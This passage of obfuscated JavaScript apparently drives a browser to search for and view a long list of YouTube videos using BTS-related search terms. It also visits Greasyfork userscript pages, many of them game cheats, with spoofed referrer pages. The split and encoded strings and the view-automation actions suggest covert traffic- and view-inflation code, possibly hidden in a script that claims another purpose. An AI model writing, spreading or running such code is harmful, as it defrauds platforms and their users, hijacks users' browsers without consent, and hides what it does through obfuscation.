'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x14d2 * -0x1 + 0x5b9 * -0x1 + 0x78b * -0x2);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    W(0x11) + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    X(0x2, 'EfUd') + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + W(0xa) + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + V(0x6) + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + V(0x13),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + V(0x1a) + 'pts/374794' + V(0xb) + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': X(0x14, 'zdRV') + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': W(0x1e) + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + V(0x1d)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': X(0xc, '@)EJ') + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
